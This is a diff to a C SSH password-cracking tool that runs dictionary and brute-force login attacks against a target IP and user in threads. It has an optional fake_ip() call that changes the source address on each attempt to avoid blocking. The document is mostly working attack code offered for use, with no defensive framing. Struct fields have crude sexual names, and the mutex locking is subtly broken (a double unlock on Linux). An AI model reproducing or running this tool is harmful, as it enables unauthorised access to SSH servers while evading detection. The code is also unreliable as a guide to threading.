@@ -31,6 +31,8 @@ struct hentai {
     char *hotel; //ip
     char *jk;    //name
     int vagina;  //port
+    char av[256];//filename
+    char ok[2]; //bool
 } otintin;
 
 //見たとおり。
@@ -196,75 +198,101 @@ int ssh_main_connection(char password[]) {
 }
 
 //辞書攻撃
-void dictionary_attack() {
+void *dictionary_attack(void *p) {
     int (*p_func)(char*) = &ssh_main_connection;
-    char filename[256], str[MAXLEN] = {0};
+    char str[MAXLEN] = {0};
     int logical = -1;
-    logo();
-    printf("\nEnter a file name.\n: ");
-    fgets(filename, sizeof(filename), stdin);
-    filename[strcspn(filename, "\n")] = 0;
-#if __linux__
-    char bol[2];
-    logo();
-    printf("\nDo you want the IP address to change every time?[y/n]\n: ");
-    fgets(bol, sizeof(bol), stdin);
-    bol[strcspn(bol, "\n")] = 0;
-#endif
     FILE *fp;
-    if ((fp = fopen(filename, "r")) == NULL) {
+    if ((fp = fopen(otintin.av, "r")) == NULL) {
         printf("Error: Could not open file.\n");
         exit(1);
     }
-    printf("\nAnalyzing %s password...\n", otintin.hotel);
     while (fgets(str, MAXLEN, fp) != NULL) {
-#if __linux__
-        if (bol[0] == 'y') fake_ip();
-#endif
         str[strcspn(str, "\n")] = 0;
+        pthread_mutex_lock(&mutex);
+#if __linux__
+        if (otintin.ok[0] == 'y') fake_ip();
+        pthread_mutex_unlock(&mutex);
+#endif
         if ((*p_func)(str) == 0) {
             logical = 1;
+            pthread_mutex_unlock(&mutex);
             break;
         }
+        pthread_mutex_unlock(&mutex);
     }
     if (logical != 1) {
         printf("\nPassword not found :(\n");
     }
     fclose(fp);
-    return;
+    return NULL;
 }
 
 //総当たり攻撃
-void brute_force_attack() {
+void *brute_force_attack(void *p) {
     int (*p_func)(char*) = &ssh_main_connection;
     const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
     char str[MAXLEN + 1] = {0};
     int index[MAXLEN + 1] = {0};
     int i, carry;
-#if __linux__
-    char bol[2];
-    logo();
-    printf("\nDo you want the IP address to change every time?[y/n]\n: ");
-    fgets(bol, sizeof(bol), stdin);
-    bol[strcspn(bol, "\n")] = 0;
-#endif
-    printf("\nAnalyzing %s password...\n", otintin.hotel);
     do {
 #if __linux__
-        if (bol[0] == 'y') fake_ip();
+        pthread_mutex_lock(&mutex);
+        if (otintin.ok[0] == 'y') {
+            fake_ip();
+        }
+        pthread_mutex_unlock(&mutex);
 #endif
         if ((*p_func)(str) == 0) {
             break;
         }
         for(i = 0, index[i]++, carry = !0; carry; i++) {
+            pthread_mutex_lock(&mutex);
             carry = index[i] >= strlen(x);
             if (carry) {
                 index[i+1]++;
                 index[i] = 1;
             }
             str[i] = x[index[i]];
+            pthread_mutex_unlock(&mutex);
         }
     } while(index[MAXLEN] == 0);
+    return NULL;
+}
+
+void hello_world(int n) {
+    pthread_t p1;
+    pthread_mutex_init(&mutex, NULL);
+
+    if (n == 1) { //辞書攻撃
+        logo();
+        printf("\nEnter a file name.\n: ");
+        fgets(otintin.av, sizeof(otintin.av), stdin);
+        otintin.av[strcspn(otintin.av, "\n")] = 0;
+#if __linux__
+        logo();
+        printf("\nDo you want the IP address to change every time?[y/n]\n: ");
+        fgets(otintin.ok, sizeof(otintin.ok), stdin);
+        otintin.ok[strcspn(otintin.ok, "\n")] = 0;
+#endif
+        printf("\nAnalyzing %s password...\n", otintin.hotel);
+        pthread_create(&p1, NULL, &dictionary_attack, NULL);
+        pthread_join(p1, NULL);
+    }
+    else { //Other
+#if __linux__
+        logo();
+        printf("\nDo you want the IP address to change every time?[y/n]\n: ");
+        fgets(otintin.ok, sizeof(otintin.ok), stdin);
+        otintin.ok[strcspn(otintin.ok, "\n")] = 0;
+#endif
+        printf("\nAnalyzing %s password...\n", otintin.hotel);
+        pthread_create(&p1, NULL, &brute_force_attack, NULL);
+        pthread_join(p1, NULL);
+    }
+
+    pthread_mutex_destroy(&mutex);
+
     return;
 }
 
@@ -284,7 +312,7 @@ int main(int argc, char* argv[]) {
     }
     
     logo();
-
+    
     otintin.hotel = argv[2];
     otintin.jk = argv[6];
     
@@ -293,15 +321,15 @@ int main(int argc, char* argv[]) {
     printf("[*] Select Mode [1/2]: ");
     fgets(c_mode, sizeof(c_mode), stdin);
     if (c_mode[0] == '\n') {
-        dictionary_attack();
+        hello_world(1);
     }
     mode = atoi(c_mode);
     switch (mode) {
     case 1:
-        brute_force_attack();
+        hello_world(0);
         break;
     case 2:
-        dictionary_attack();
+        hello_world(1);
         break;
     default:
         printf("Error: Do you know what an integer is?\n");
